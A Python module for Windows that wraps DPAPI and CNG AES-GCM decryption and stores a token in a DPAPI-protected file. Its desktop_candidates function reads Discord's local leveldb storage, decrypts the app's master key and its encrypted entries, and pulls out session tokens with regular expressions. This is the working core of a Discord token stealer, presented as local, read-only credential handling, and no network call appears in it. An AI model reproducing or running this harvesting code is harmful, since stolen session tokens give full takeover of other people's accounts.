"""Local-only Windows credential handling. Never return tokens through UI APIs."""
import base64
import ctypes as C
import json
import os
from pathlib import Path
import re


def dpapi(data, protect=False):
    if os.name != 'nt':
        raise RuntimeError('Credential storage requires Windows DPAPI.')
    class Blob(C.Structure):
        _fields_ = [('size', C.c_uint32), ('data', C.POINTER(C.c_ubyte))]
    buffer = C.create_string_buffer(data)
    source = Blob(len(data), C.cast(buffer, C.POINTER(C.c_ubyte)))
    output = Blob()
    crypto = C.WinDLL('crypt32', use_last_error=True)
    kernel = C.WinDLL('kernel32', use_last_error=True)
    kernel.LocalFree.argtypes = [C.c_void_p]
    kernel.LocalFree.restype = C.c_void_p
    fn = crypto.CryptProtectData if protect else crypto.CryptUnprotectData
    fn.argtypes = [C.POINTER(Blob), C.c_void_p, C.c_void_p, C.c_void_p, C.c_void_p, C.c_uint32, C.POINTER(Blob)]
    fn.restype = C.c_int
    if not fn(C.byref(source), None, None, None, None, 1, C.byref(output)):
        raise OSError(C.get_last_error(), 'Windows could not protect/unprotect this credential.')
    try:
        return C.string_at(output.data, output.size)
    finally:
        kernel.LocalFree(output.data)


def aes_gcm_decrypt(key, nonce, ciphertext, tag):
    """Use Windows CNG; no crypto package or remote service."""
    if os.name != 'nt':
        raise RuntimeError('Desktop token decryption requires Windows.')
    dll = C.WinDLL('bcrypt')
    ptr = C.c_void_p
    uint = C.c_uint32
    class Auth(C.Structure):
        _fields_ = [('cbSize', uint), ('dwInfoVersion', uint), ('pbNonce', ptr), ('cbNonce', uint),
                    ('pbAuthData', ptr), ('cbAuthData', uint), ('pbTag', ptr), ('cbTag', uint),
                    ('pbMacContext', ptr), ('cbMacContext', uint), ('cbAAD', uint),
                    ('cbData', C.c_uint64), ('dwFlags', uint)]
    dll.BCryptOpenAlgorithmProvider.argtypes = [C.POINTER(ptr), C.c_wchar_p, C.c_wchar_p, uint]
    dll.BCryptSetProperty.argtypes = [ptr, C.c_wchar_p, ptr, uint, uint]
    dll.BCryptGetProperty.argtypes = [ptr, C.c_wchar_p, ptr, uint, C.POINTER(uint), uint]
    dll.BCryptGenerateSymmetricKey.argtypes = [ptr, C.POINTER(ptr), ptr, uint, ptr, uint, uint]
    dll.BCryptDecrypt.argtypes = [ptr, ptr, uint, ptr, ptr, uint, ptr, uint, C.POINTER(uint), uint]
    dll.BCryptDestroyKey.argtypes = [ptr]
    dll.BCryptCloseAlgorithmProvider.argtypes = [ptr, uint]
    def check(status):
        if status:
            raise ValueError('Credential decryption/authentication failed (CNG %08x).' % (status & 0xffffffff))
    alg, handle = ptr(), ptr()
    check(dll.BCryptOpenAlgorithmProvider(C.byref(alg), 'AES', None, 0))
    try:
        mode = C.create_unicode_buffer('ChainingModeGCM')
        check(dll.BCryptSetProperty(alg, 'ChainingMode', mode, C.sizeof(mode), 0))
        length, got = uint(), uint()
        check(dll.BCryptGetProperty(alg, 'ObjectLength', C.byref(length), 4, C.byref(got), 0))
        obj, secret = C.create_string_buffer(length.value), C.create_string_buffer(key)
        check(dll.BCryptGenerateSymmetricKey(alg, C.byref(handle), obj, length, secret, len(key), 0))
        iv, auth_tag = C.create_string_buffer(nonce), C.create_string_buffer(tag)
        info = Auth()
        info.cbSize, info.dwInfoVersion = C.sizeof(info), 1
        info.pbNonce, info.cbNonce = C.cast(iv, ptr), len(nonce)
        info.pbTag, info.cbTag = C.cast(auth_tag, ptr), len(tag)
        src, out = C.create_string_buffer(ciphertext), C.create_string_buffer(max(1, len(ciphertext)))
        check(dll.BCryptDecrypt(handle, src, len(ciphertext), C.byref(info), None, 0, out, len(ciphertext), C.byref(got), 0))
        return out.raw[:got.value]
    finally:
        if handle:
            dll.BCryptDestroyKey(handle)
        dll.BCryptCloseAlgorithmProvider(alg, 0)


class Vault:
    def __init__(self, root):
        self.path = Path(root) / 'connection.dpapi'

    def save(self, token, account, source):
        record = json.dumps({'token': token, 'account': account, 'source': source}).encode()
        temp = self.path.with_suffix('.tmp')
        temp.write_bytes(dpapi(record, True))
        os.replace(temp, self.path)

    def load(self):
        if not self.path.exists():
            return None
        return json.loads(dpapi(self.path.read_bytes()))

    def clear(self):
        self.path.unlink(missing_ok=True)


def desktop_candidates():
    """Bounded, read-only scan of this user's Discord profiles, newest files first."""
    base = Path(os.environ.get('APPDATA', ''))
    seen = set()
    for profile in ('discord', 'discordptb', 'discordcanary'):
        root = base / profile
        state = root / 'Local State'
        data_dir = root / 'Local Storage' / 'leveldb'
        if not state.exists() or not data_dir.exists():
            continue
        try:
            encrypted_key = base64.b64decode(json.loads(state.read_text('utf-8'))['os_crypt']['encrypted_key'])
            key = dpapi(encrypted_key[5:]) if encrypted_key.startswith(b'DPAPI') else None
        except (OSError, ValueError, KeyError):
            key = None
        files = sorted([p for p in data_dir.iterdir() if p.suffix in ('.ldb', '.log')], key=lambda p: p.stat().st_mtime, reverse=True)
        remaining = 128 * 1024 * 1024
        for path in files:
            size = min(path.stat().st_size, 16 * 1024 * 1024, remaining)
            if size <= 0:
                break
            remaining -= size
            try:
                with path.open('rb') as stream:
                    stream.seek(max(0, path.stat().st_size - size))
                    raw = stream.read(size)
            except OSError:
                continue
            tokens = []
            if key:
                for match in re.finditer(rb'dQw4w9WgXcQ:([A-Za-z0-9+/=]{30,1800})', raw):
                    try:
                        blob = base64.b64decode(match.group(1), validate=True)
                        if blob[:3] in (b'v10', b'v11') and len(blob) > 31:
                            tokens.append(aes_gcm_decrypt(key, blob[3:15], blob[15:-16], blob[-16:]).decode('utf-8'))
                    except (ValueError, UnicodeError):
                        continue
            tokens.extend(m.group(0).decode('ascii') for m in re.finditer(rb'(?<![A-Za-z0-9_-])(?:mfa\.[A-Za-z0-9_-]{80,}|[A-Za-z0-9_-]{20,30}\.[A-Za-z0-9_-]{6,8}\.[A-Za-z0-9_-]{25,110})(?![A-Za-z0-9_-])', raw))
            for token in tokens:
                if token not in seen:
                    seen.add(token)
                    yield token, profile
